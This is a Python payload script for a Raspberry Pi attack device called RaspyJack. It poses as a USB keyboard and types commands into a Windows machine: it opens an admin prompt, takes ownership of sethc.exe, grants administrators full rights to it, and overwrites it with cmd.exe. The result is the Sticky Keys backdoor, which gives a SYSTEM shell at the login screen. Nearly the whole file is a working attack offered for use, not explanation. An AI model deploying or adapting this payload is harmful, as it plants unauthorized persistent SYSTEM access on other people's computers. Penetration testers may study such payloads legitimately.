#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Sticky Keys Backdoor**
============================================================
A HID attack that replaces the Sticky Keys executable (`sethc.exe`) with
a copy of the Command Prompt (`cmd.exe`).

This is a classic persistence technique. After this payload is run,
pressing the Shift key five times on the Windows login screen will open
a Command Prompt with SYSTEM-level privileges, as `sethc.exe` is run
by the SYSTEM account.

**NOTE:** This requires the user to accept a UAC prompt.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Sticky Keys"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # Commands to take ownership of sethc.exe and replace it with cmd.exe
    cmd1 = "takeown /f c:\\windows\\system32\\sethc.exe"
    cmd2 = "icacls c:\\windows\\system32\\sethc.exe /grant administrators:f"
    cmd3 = "copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\sethc.exe"

    script = f"""
GUI x
delay(500)
press("a")
delay(1500)
type("{cmd1}")
press("ENTER")
delay(500)
type("{cmd2}")
press("ENTER")
delay(500)
type("{cmd3}")
press("ENTER")
delay(200)
type("y")
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
